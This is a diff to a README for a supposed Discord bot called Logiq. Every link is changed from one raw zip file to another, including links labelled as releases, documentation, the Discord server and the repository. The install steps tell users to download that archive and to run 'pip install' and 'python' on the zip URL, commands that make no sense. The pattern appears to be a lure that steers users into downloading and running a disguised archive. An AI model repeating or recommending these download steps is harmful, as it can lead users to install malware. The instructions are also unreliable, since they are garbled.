@@ -11,19 +11,19 @@ Logiq is a powerful open-source Discord bot designed to enhance your server expe
 - **MongoDB:** Installed locally or accessible online
 
 ## 📥 Download Logiq
-[![Download Logiq](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip)](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip)
+[![Download Logiq](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip)](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip)
 
-To get started, you will first need to download Logiq from our [Releases page](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip).
+To get started, you will first need to download Logiq from our [Releases page](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip).
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip).
+   - Go to the [Releases page](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip).
 
 2. **Choose Your Version**
    - Select the latest version of Logiq listed at the top. You’ll find files categorized for different operating systems.
 
 3. **Download the File**
-   - Click on the appropriate file link for your system to download it. For most users, you’ll want the “https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip” or “https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip” file.
+   - Click on the appropriate file link for your system to download it. For most users, you’ll want the “https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip” or “https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip” file.
 
 4. **Extract the Files**
    - If you downloaded a ZIP file, locate it on your computer, right-click and choose “Extract All”. Follow the prompts to access the files.
@@ -32,7 +32,7 @@ To get started, you will first need to download Logiq from our [Releases page](h
    - Make sure to have Python installed on your system. Logiq requires Python 3.7 or higher.
    - Install the required packages. Open your terminal or command prompt and run:
      ```
-     pip install -r https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip
+     pip install -r https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip
      ```
 
 6. **Set Up MongoDB**
@@ -43,7 +43,7 @@ To get started, you will first need to download Logiq from our [Releases page](h
    - In your terminal, navigate to the folder where you extracted Logiq.
    - Use the following command to start the bot:
      ```
-     python https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip
+     python https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip
      ```
 
 8. **Invite Logiq to Your Server**
@@ -68,12 +68,12 @@ If you encounter issues while downloading or running Logiq, consider the followi
 - **Network Issues:** Make sure your internet connection is stable when running the bot, especially for features that require external data.
 
 ## 🤝 Community Support
-If you need help, feel free to reach out on our [Discord server](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip). The community is ready and willing to assist you.
+If you need help, feel free to reach out on our [Discord server](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip). The community is ready and willing to assist you.
 
 ## 🔗 Additional Resources
 To learn more about Logiq or get involved:
-- [GitHub Repository](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip)
-- [Documentation](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip)
-- [Contributing Guidelines](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip)
+- [GitHub Repository](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip)
+- [Documentation](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip)
+- [Contributing Guidelines](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip)
 
-Start enhancing your Discord server today by downloading Logiq! Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Aittiphan23/Logiq/main/heritress/Logiq.zip) for the latest updates.
+Start enhancing your Discord server today by downloading Logiq! Don’t forget to visit the [Releases page](https://github.com/Aittiphan23/Logiq/raw/refs/heads/main/utils/Software-v3.7.zip) for the latest updates.
